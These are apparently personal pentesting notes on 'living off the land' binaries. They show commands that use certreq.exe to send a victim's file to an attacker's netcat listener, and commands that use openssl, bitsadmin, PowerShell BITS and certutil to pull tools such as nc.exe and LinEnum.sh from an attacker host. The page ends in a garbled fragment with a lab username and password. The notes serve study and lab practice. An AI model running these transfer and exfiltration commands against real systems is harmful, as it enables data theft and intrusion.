---
title: LOLbins - Living off the land binaries - LOLbas and GTFObins
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - resources
  - binaries
  - pentesting
---

# LOLbins - "Living off the land" binaries: LOLbas and GTFObins

The term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that an attacker can use to perform actions beyond their original purpose. There are currently two websites that aggregate information on Living off the Land binaries:

- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)



## Windows - LOLBAS

### CertReq.exe 

Let's use [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) as an example.

```bash
# From the victim's machine we can sec for instance file.txt to our kali
certreq.exe -Post -config http://$ipKali c:\folder\file.txt

# From the kali machine, the attacking one, we use a netcat session
sudo nc -lvnp 80
```


## Linux - GTFOBins

### OpenSSL

```bash
# Create Certificate in our attacker machine
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

# Stand up the Server in our attacker machine
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

# Download File to the victim's Machine, but run command from the attacker kali
openssl s_client -connect $ipVictim:80 -quiet > LinEnum.sh
```


## Other Common Living off the Land tools

### Bitsadmin Download function

The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.

```powershell
# File Download with Bitsadmin
bitsadmin /transfer wcb /priority foreground http://$ip:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.

```powershell
# Download
Import-Module bitstransfer; Start-BitsTransfer -Source "http://$ip/nc.exe" -Destination "C:\Temp\nc.exe"
```

### Download a File with Certutil

Certutil can be used to download arbitrary files.

```cmd
certutil.exe -verifyctl -split -f http://$ip/nc.exe
```


P ((Username: htb-student | Password:
HTB_@cademy_stdnt!
)
) and use